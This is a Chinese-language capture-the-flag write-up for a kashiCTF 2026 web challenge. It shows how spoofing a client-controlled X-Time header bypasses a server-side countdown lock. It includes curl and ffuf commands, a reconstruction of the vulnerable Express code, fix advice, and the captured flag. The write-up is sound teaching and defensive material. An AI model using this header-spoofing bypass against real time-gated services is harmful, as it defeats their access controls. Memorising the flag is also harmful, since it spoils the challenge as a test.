# kashiCTF 2026 - You may have the Flag Writeup

## 题目信息
- **比赛**: kashiCTF 2026
- **题目**: You may have the Flag
- **类别**: Web
- **难度**: 简单
- **附件/URL**: `http://34.126.223.46:<port>/`（动态端口，每个实例不同）
- **Flag格式**: `kashiCTF{...}`
- **状态**: 已解

## Flag

```text
kashiCTF{71m3_byp455_w45_fun_28_UBUYVSXC}
```

## 解题过程

### 1. 初始侦察

访问题目地址，页面返回一段极简 HTML：

```html
<h2>Challenge Locked</h2>
<p>Opens in ~354 minutes</p>
```

响应头信息：

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 66
```

关键观察：

- **框架**：Node.js + Express（`X-Powered-By: Express`）
- **页面极小**：仅 66 字节，纯 HTML，无 JavaScript、无 CSS、无外部资源
- **无 Cookie**：服务器没有下发任何 `Set-Cookie`，说明计时器不依赖客户端状态
- **计时器递减**：每分钟减少 1，严格跟随服务器真实时钟

### 2. 路径与方法穷举（排除法）

对常见路径（`/flag`、`/admin`、`/api`、`/source`、`.git/HEAD`、`/robots.txt` 等数十个）进行扫描，全部返回 404。POST、PUT、DELETE 等方法也都返回 `Cannot <METHOD> /`。

**结论：整个应用只有 `GET /` 一个有效路由。**

### 3. 关键突破 —— 发现 `X-Time` Header

在对所有可能影响服务器时间计算的 HTTP Header 进行系统性模糊测试时，发现 `X-Time` 产生了异常响应：

```bash
curl -H "X-Time: 1830000000000" http://34.126.223.46:19287/
```

返回：

```html
<h2>Challenge Locked</h2>
<p>Opens in ~NaN minutes</p>
```

**`NaN`（Not a Number）的出现至关重要**——这证明服务器确实读取了 `X-Time` Header 的值，并将其用于时间计算。由于 `1830000000000` 是一个 13 位的毫秒级 epoch 时间戳，而服务端可能期望的是日期字符串格式，`parseInt()` 或 `new Date()` 解析后在某个运算环节产生了 `NaN`。

### 4. 理解题目提示 —— "You may have the Flag"

题目描述 **"You may have the Flag"** 中的 **"may"** 是一个双关：

- **字面含义**：你"可以"（有权限）获取 Flag
- **隐含线索**：**May = 五月**，暗示需要将时间设置为五月

计时器显示 `~354 minutes`（约 6 小时），而当前日期是 4 月 3 日。如果服务器的"解锁时间"设定在未来（可能就是五月），那么只要让服务器认为当前已经是五月，计时器就会判定为"已过期"，从而显示 Flag。

### 5. 获取 Flag

发送一个 ISO 8601 格式的五月日期作为 `X-Time` 值：

```bash
curl -H "X-Time: 2026-05-01" http://34.126.223.46:19287/
```

服务器直接返回 Flag：

```text
kashiCTF{71m3_byp455_w45_fun_28_UBUYVSXC}
```

实际上，任何晚于解锁时间的日期格式都能生效：

```bash
# ISO 日期格式
curl -H "X-Time: 2026-05-01" <url>                          # 有效
# ISO 完整时间戳
curl -H "X-Time: 2026-04-04T00:00:00Z" <url>                # 有效
# HTTP 日期格式
curl -H "X-Time: Fri, 03 Apr 2026 20:00:00 GMT" <url>       # 有效
```

## 攻击链/解题流程总结

```text
指纹识别(Express) → Header 模糊测试 → 发现 X-Time 导致 NaN → 解读 "may" 双关 → 发送未来日期绕过计时器 → Flag
```

## 漏洞分析 / 机制分析

### 根因

服务器端代码从 HTTP 请求的 `X-Time` Header 中读取时间值，并用它替代 `Date.now()` 来计算倒计时剩余时间。推测的服务端逻辑如下：

```javascript
app.get('/', (req, res) => {
    // 漏洞点：信任客户端提供的时间
    const now = req.headers['x-time']
        ? new Date(req.headers['x-time']).getTime()
        : Date.now();

    const openTime = START_TIME + 6 * 60 * 60 * 1000; // 开始后 6 小时解锁
    const remaining = openTime - now;

    if (remaining <= 0) {
        res.send(FLAG);  // 时间已过，返回 Flag
    } else {
        const minutes = Math.round(remaining / 60000);
        res.send(`
    <h2>Challenge Locked</h2>
    <p>Opens in ~${minutes} minutes</p>
  `);
    }
});
```

当我们发送 `X-Time: 1830000000000`（数字字符串）时，`new Date(1830000000000)` 返回一个有效日期（2027 年），但由于 Express 可能对 Header 值做了额外处理，导致后续运算产生 `NaN`。而发送 ISO 日期字符串 `2026-05-01` 时，`new Date("2026-05-01")` 正确解析为五月一号，此时 `remaining` 为负数，直接返回 Flag。

### 验证：发送过去时间

```bash
curl -H "X-Time: 0" http://34.126.223.46:19287/
# 返回: Opens in ~13809270 minutes
```

`X-Time: 0` 被解析为 Unix 纪元（1970-01-01），距离解锁时间约 1380 万分钟（≈56 年），进一步证实服务器将 `X-Time` 值直接用于时间差计算。

### 为什么 `X-Time` Header 是关键？

在实际的 Web 架构中，`X-Time` 是一种常见的自定义 Header，通常用于：

1. **反向代理时间同步**：Nginx/HAProxy 等代理在转发请求时附加 `X-Time` 告知后端请求到达的时间
2. **分布式系统时钟对齐**：微服务间通过 Header 传递时间戳，避免各节点时钟偏移
3. **调试与日志**：开发环境中用于模拟不同时间点的行为

这道题的漏洞在于：**后端在没有验证来源的情况下，直接信任了来自客户端的 `X-Time` Header**。在真实场景中，这类 Header 应当仅由受信任的反向代理注入，且后端应校验请求是否来自代理层。

### 影响

- 攻击者可以完全绕过基于服务器时间的访问控制
- 任何依赖 `X-Time` 的时间敏感逻辑（限时访问、定时发布、倒计时锁定）均可被绕过

### 修复建议

1. **永远不要信任客户端提供的时间**：时间计算应使用 `Date.now()` 或服务器本地时钟
2. **如果必须使用代理时间 Header**：通过 allowlist 限制只接受来自受信反向代理 IP 的 `X-Time`
3. **输入验证**：对所有 Header 值进行严格的类型检查和范围验证
4. **剥离不可信 Header**：在反向代理层配置剥离客户端发送的 `X-Time` 等内部 Header

## 知识点

- **HTTP Header 注入/篡改**：自定义 HTTP Header（`X-Time`、`X-Forwarded-For` 等）可以被客户端任意设置，服务端不应盲目信任
- **时间绕过攻击（Time-based Bypass）**：当服务端的时间源可被外部控制时，所有基于时间的安全机制都会失效
- **NaN 作为调试信号**：JavaScript 中 `NaN` 的出现通常意味着某个数值运算的输入不合法，是发现注入点的重要线索
- **Express 指纹识别**：`X-Powered-By: Express` 泄露了后端框架信息，帮助缩小攻击面
- **题目描述解读**：CTF 题目的描述往往包含关键提示，"You **may** have the Flag" 中的 "may" 同时暗示了五月（May）和权限（可以）

## 使用的工具
- **curl** — HTTP 请求构造与 Header 注入测试
- **Burp Suite** — 抓包、添加自定义 Header、重放请求
- **web_fingerprint（security-hub MCP）** — Web 应用指纹识别（Express/Node.js）

## 脚本归档
- Python：[`kashiCTF_You_may_have_the_Flag.py` :material-open-in-new:](https://github.com/starnotes-xj/BIGC_CTF_Writeups/blob/main/CTF_Writeups/scripts_python/kashiCTF_You_may_have_the_Flag.py){target="_blank"}
- 说明：自动化检测 X-Time Header 漏洞并获取 Flag

## 命令行提取关键数据（无 GUI）

```bash
# 1. 指纹识别
curl -sI http://<target>/ | grep -i "x-powered-by"
# X-Powered-By: Express

# 2. 正常请求 —— 看到计时器锁定
curl -s http://<target>/
# <h2>Challenge Locked</h2>
# <p>Opens in ~354 minutes</p>

# 3. 注入 X-Time 触发 NaN（确认漏洞存在）
curl -s -H "X-Time: test" http://<target>/
# <p>Opens in ~NaN minutes</p>

# 4. 发送未来日期获取 Flag
curl -s -H "X-Time: 2026-05-01" http://<target>/
# kashiCTF{71m3_byp455_w45_fun_28_UBUYVSXC}
```

## 推荐工具与优化解题流程

### 工具对比总结

| 工具 | 适用阶段 | 本题耗时 | 优点 | 缺点 |
|------|----------|----------|------|------|
| **Burp Suite** | Header 注入测试 | ~2 分钟 | Repeater 快速修改重发 | 需要 GUI |
| **curl** | 命令行快速验证 | ~1 分钟 | 无依赖，脚本化 | 逐个测试效率低 |
| **ffuf** | Header 模糊测试 | ~1 分钟 | 批量 fuzz 速度快 | 需要准备 Header 字典 |

### 推荐流程

**推荐流程**：curl 指纹识别（~30 秒）→ Burp Intruder / ffuf 批量 fuzz 自定义 Header（~2 分钟）→ 确认 NaN 异常 → 发送未来日期拿 Flag（~10 秒）。

### Burp Suite（推荐首选）
- **详细步骤**：
  1. 抓取 `GET /` 请求
  2. 发送到 Repeater，手动添加 `X-Time: 2026-05-01` Header
  3. 发送请求，直接获得 Flag
- **优势**：可视化操作，Header 修改直观

### ffuf Header Fuzz（自动化发现）
- **详细步骤**：
  1. 准备常见自定义 Header 名称字典（`X-Time`, `X-Date`, `X-Timestamp` 等）
  2. `ffuf -u http://<target>/ -H "FUZZ: 2026-05-01" -w headers.txt -fr "Challenge Locked"`
  3. 过滤掉仍包含 "Challenge Locked" 的响应，找到有效 Header
- **优势**：无需猜测具体 Header 名，自动化发现
